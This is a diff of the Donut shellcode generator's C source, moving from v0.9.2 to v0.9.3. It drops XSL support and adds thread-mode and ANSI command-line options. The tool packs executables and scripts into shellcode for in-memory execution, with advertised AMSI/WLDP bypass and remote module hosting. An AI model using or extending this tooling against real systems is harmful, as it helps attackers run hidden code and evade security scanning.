@@ -57,6 +57,8 @@ static API_IMPORT api_imports[]=
   {KERNEL32_DLL, "AllocConsole"},
   {KERNEL32_DLL, "AttachConsole"},
 
+  {SHELL32_DLL,  "CommandLineToArgvW"},
+  
   {OLEAUT32_DLL, "SafeArrayCreate"},
   {OLEAUT32_DLL, "SafeArrayCreateVector"},
   {OLEAUT32_DLL, "SafeArrayPutElement"},
@@ -146,16 +148,6 @@ static GUID xCLSID_VBScript = {
 
 static GUID xCLSID_JScript  = {
   0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};
-
-// required to load XSL files
-static GUID xCLSID_DOMDocument30 = {
-  0xf5078f32, 0xc551, 0x11d3, {0x89, 0xb9, 0x00, 0x00, 0xf8, 0x1f, 0xe2, 0x21}};
-
-static GUID xIID_IXMLDOMDocument = {
-  0x2933BF81, 0x7B36, 0x11D2, {0xB2, 0x0E, 0x00, 0xC0, 0x4F, 0x98, 0x3E, 0x60}};
-  
-static GUID xIID_IXMLDOMNode = {
-  0x2933bf80, 0x7b36, 0x11d2, {0xb2, 0x0e, 0x00, 0xc0, 0x4f, 0x98, 0x3e, 0x60}};
 
 #if defined(_WIN32) | defined(_WIN64)
 #include "include/mmap-windows.c"
@@ -331,12 +323,6 @@ static int get_file_info(const char *path, file_info *fi) {
       fi->type = DONUT_MODULE_JS;
       fi->arch = DONUT_ARCH_ANY;
     } else 
-    // XSL?
-    if (strcasecmp(ext, ".xsl") == 0) {
-      DPRINT("Module is XSL");
-      fi->type = DONUT_MODULE_XSL;
-      fi->arch = DONUT_ARCH_ANY;
-    } else
     // EXE?
     if (strcasecmp(ext, ".exe") == 0) {
       DPRINT("Module is EXE");
@@ -532,21 +518,10 @@ static int GenRandomString(void *output, uint64_t len) {
     return 1;
 }
 
-// cheapo conversion from utf8 to utf16
-static uint64_t utf8_to_utf16(void* dst, const char* src) {
-    uint16_t *out = (uint16_t*)dst;
-    uint64_t   i;
-    
-    for(i=0; src[i] != 0; i++) {
-      out[i] = src[i];
-    }
-    return i;
-}
-
 static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     PDONUT_MODULE mod = NULL;
     uint64_t      len = 0;
-    char          *param, parambuf[DONUT_MAX_NAME*DONUT_MAX_PARAM+DONUT_MAX_PARAM];
+    char          cmdline[DONUT_MAX_NAME+1];
     int           cnt, err=DONUT_ERROR_SUCCESS;
     
     DPRINT("Entering.");
@@ -563,7 +538,10 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     
     // Set the type of module
     mod->type = fi->type;
-      
+    
+    mod->thread = c->thread;
+    mod->ansi   = c->ansi;
+    
     // DotNet assembly?
     if(mod->type == DONUT_MODULE_NET_DLL ||
        mod->type == DONUT_MODULE_NET_EXE)
@@ -575,57 +553,34 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
           goto cleanup;
         }
       }
-      // convert to unicode format.
-      // wchar_t is 32-bits on linux, but 16-bit on windows. :-|
+      // Set the domain name to use
       DPRINT("Domain  : %s", c->domain);
-      utf8_to_utf16(mod->domain, c->domain);
+      strncpy(mod->domain, c->domain, DONUT_DOMAIN_LEN);
       
       // Assembly is DLL? Copy the class and method
       if(mod->type == DONUT_MODULE_NET_DLL) {
         DPRINT("Class   : %s", c->cls);
-        utf8_to_utf16(mod->cls, c->cls);
+        strncpy(mod->cls, c->cls, DONUT_MAX_NAME-1);
         
         DPRINT("Method  : %s", c->method);
-        utf8_to_utf16(mod->method, c->method);
+        strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
       }
       // If no runtime specified in configuration, use version from assembly
       if(c->runtime[0] == 0) {
         strncpy(c->runtime, fi->ver, DONUT_MAX_NAME-1);
       }
       DPRINT("Runtime : %s", c->runtime);
-      utf8_to_utf16(mod->runtime, c->runtime);
+      strncpy(mod->runtime, c->runtime, DONUT_MAX_NAME-1);
     } else
     // Unmanaged DLL? check for exported api          
-    if(mod->type == DONUT_MODULE_DLL && 
-       c->method[0] != 0) 
-    {
+    if(mod->type == DONUT_MODULE_DLL && c->method[0] != 0) {
       DPRINT("DLL function : %s", c->method);
-      strncpy((char*)mod->method, c->method, DONUT_MAX_NAME-1);
+      strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
     }
       
     // Parameters specified?
     if(c->param[0] != 0) {
-      strncpy(parambuf, c->param, sizeof(parambuf)-1);
-      cnt = 0;
-      // Split by comma or semi-colon
-      param = strtok(parambuf, ",;");
-      
-      while(param != NULL && cnt < DONUT_MAX_PARAM) {
-        if(strlen(param) >= DONUT_MAX_NAME) {
-          DPRINT("Parameter : \"%s\" exceeds DONUT_MAX_PARAM(%i)", 
-            param, DONUT_MAX_NAME);
-          err = DONUT_ERROR_INVALID_PARAMETER;
-          goto cleanup;
-        }
-        DPRINT("Adding \"%s\"", param);
-        // convert ansi string to wide character string
-        utf8_to_utf16(mod->param[cnt++], param);
-
-        // get next parameter
-        param = strtok(NULL, ",;");
-      }
-      // set number of parameters
-      mod->param_cnt = cnt;
+      strncpy(mod->param, c->param, DONUT_MAX_NAME-1);
     }
     
     // set length of module data
@@ -722,6 +677,7 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
     strcpy(inst->dll_name[inst->dll_cnt++], "oleaut32.dll");
     strcpy(inst->dll_name[inst->dll_cnt++], "wininet.dll");  
     strcpy(inst->dll_name[inst->dll_cnt++], "mscoree.dll");
+    strcpy(inst->dll_name[inst->dll_cnt++], "shell32.dll");
         
     // if module is .NET assembly
     if(c->mod_type == DONUT_MODULE_NET_DLL ||
@@ -751,23 +707,14 @@ static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
       memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));
       memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));
       
-      utf8_to_utf16(inst->wscript,     "WScript");
-      utf8_to_utf16(inst->wscript_exe, "wscript.exe");
+      strcpy(inst->wscript,     "WScript");
+      strcpy(inst->wscript_exe, "wscript.exe");
       
       if(c->mod_type == DONUT_MODULE_VBS) {
         memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
       } else {
         memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
       }
-    } else
-    // if module is XSL
-    if(c->mod_type == DONUT_MODULE_XSL)
-    {
-      DPRINT("Copying GUID structures for loading XSL to instance");
-      
-      memcpy(&inst->xCLSID_DOMDocument30,  &xCLSID_DOMDocument30,  sizeof(GUID));
-      memcpy(&inst->xIID_IXMLDOMDocument,  &xIID_IXMLDOMDocument,  sizeof(GUID));
-      memcpy(&inst->xIID_IXMLDOMNode,      &xIID_IXMLDOMNode,      sizeof(GUID));
     }
 
     // required to disable AMSI
@@ -967,8 +914,7 @@ int DonutCreate(PDONUT_CONFIG c) {
         goto cleanup;
       }
       // DLL function specified. Does it exist?
-      if(c->mod_type == DONUT_MODULE_DLL &&
-         c->method[0] != 0)
+      if(c->mod_type == DONUT_MODULE_DLL && c->method[0] != 0)
       {
         DPRINT("Validating DLL function \"%s\" for DLL", c->method);
         if(!is_dll_export(&fi, c->method)) {
@@ -987,8 +933,7 @@ int DonutCreate(PDONUT_CONFIG c) {
     }
     
     // is this an unmanaged DLL with parameters?
-    if(c->mod_type == DONUT_MODULE_DLL &&
-       c->param[0] != 0)
+    if(c->mod_type == DONUT_MODULE_DLL && c->param[0] != 0)
     {
       // we need a DLL function
       if(c->method[0] == 0) {
@@ -1221,21 +1166,23 @@ static char* get_param (int argc, char *argv[], int *i) {
 }
 
 static void usage (void) {
-    printf(" usage: donut [options] -f <EXE/DLL/VBS/JS/XSL>\n\n");
+    printf(" usage: donut [options] -f <EXE/DLL/VBS/JS>\n\n");
     
     printf("                   -MODULE OPTIONS-\n\n");
-    printf("       -f <path>            .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory.\n");
+    printf("       -f <path>            .NET assembly, EXE, DLL, VBS, JS file to execute in-memory.\n");
 #ifdef WINDOWS
     // TODO : printf("       -x                   Pack/Compress file using LZ algorithm.\n");
 #endif
     printf("       -n <name>            Module name. Randomly generated by default.\n");
+    printf("       -w                   Command line is passed as Ansi. (default is Unicode)\n");
     printf("       -u <URL>             HTTP server that will host the donut module.\n\n");
 
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
     printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n");
     printf("       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)\n");
     printf("       -o <payload>         Output file. Default is \"payload.bin\"\n");
-    // TODO : printf("       -e                   Encode output file with Base64. (Will be copied to clipboard on Windows)\n\n");
+    //printf("       -e                   Encode output file with Base64. (Will be copied to clipboard on Windows)\n");
+    printf("       -t                   Run entrypoint for unmanaged EXE as a new thread (replaces ExitProcess with ExitThread)\n\n");
     
     printf("                   -DOTNET OPTIONS-\n\n");
     printf("       -c <namespace.class> Optional class name.  (required for .NET DLL)\n");
@@ -1262,7 +1209,7 @@ int main(int argc, char *argv[]) {
     char         *inst_type[2]= { "PIC", "URL"   };
     
     printf("\n");
-    printf("  [ Donut shellcode generator v0.9.2\n");
+    printf("  [ Donut shellcode generator v0.9.3\n");
     printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
     
     // zero initialize configuration
@@ -1274,6 +1221,8 @@ int main(int argc, char *argv[]) {
     c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
     c.compress  = 0;                      // for now, compression is disabled by default
     c.encode    = 0;                      // encode is disabled by default
+    c.thread    = 0;                      // run unmanaged EXE as thread. (replaces calls to RtlExitUserProcess with RtlExitUserThread)
+    c.ansi      = 0;                      // command line will be converted to unicode
     
     // parse arguments
     for(i=1; i<argc; i++) {
@@ -1293,9 +1242,10 @@ int main(int argc, char *argv[]) {
           c.bypass = atoi(get_param(argc, argv, &i));
           break;
         // class of .NET assembly
-        case 'c':
+        case 'c': {
           strncpy(c.cls, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
+        }
         // name of domain to use for .NET assembly
         case 'd':
           strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
@@ -1304,7 +1254,7 @@ int main(int argc, char *argv[]) {
         case 'e':
           c.encode = 1;
           break;
-        // EXE/DLL/VBS/JS/XSL file to embed in shellcode
+        // EXE/DLL/VBS/JS file to embed in shellcode
         case 'f':
           strncpy(c.file, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
@@ -1320,24 +1270,35 @@ int main(int argc, char *argv[]) {
         case 'o':
           payload = get_param(argc, argv, &i);
           break;
-        // parameters to method or DLL function
+        // parameters to method, DLL function or command line for unmanaged EXE
         case 'p':
-          strncpy(c.param, get_param(argc, argv, &i), sizeof(c.param) - 1);
+          strncpy(c.param, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
         // runtime version to use for .NET DLL / EXE
         case 'r':
           strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
+        // run unmanaged EXE as thread?
+        case 't': {
+          c.thread = 1;
+          break;
+        }
         // URL of remote module
         case 'u': {
           strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
           c.inst_type = DONUT_INSTANCE_URL;
           break;
         }
+        // don't convert command line to unicode?
+        case 'w': {
+          c.ansi = 1;
+          break;
+        }
         // pack/compress input file
-        case 'x':
+        case 'x': {
           c.compress = 1;
           break;
+        }
         // for anything else, display usage
         default:
           usage();
@@ -1352,7 +1313,7 @@ int main(int argc, char *argv[]) {
     
     // generate payload from configuration
     err = DonutCreate(&c);
-    
+
     if(err != DONUT_ERROR_SUCCESS) {
       printf("  [ Error : %s\n", err2str(err));
       return 0;
@@ -1376,9 +1337,6 @@ int main(int argc, char *argv[]) {
         break;
       case DONUT_MODULE_JS:
         mod_type = "JScript";
-        break;
-      case DONUT_MODULE_XSL:
-        mod_type = "XSL";
         break;
       default:
         mod_type = "Unrecognized";
@@ -1416,7 +1374,15 @@ int main(int argc, char *argv[]) {
     fd = fopen(payload, "wb");
     
     if(fd != NULL) {
-      fwrite(c.pic, sizeof(char), c.pic_len, fd);
+      /** encode with base64?
+      if(c.encode) {
+        // if on windows
+        #ifdef WINDOWS
+          // copy base64 string to clipboard
+        #endif
+      } else {*/
+        fwrite(c.pic, sizeof(char), c.pic_len, fd);
+      //}
       fclose(fd);
     } else {
       printf("  [ Error opening \"%s\" for payload.\n", payload);
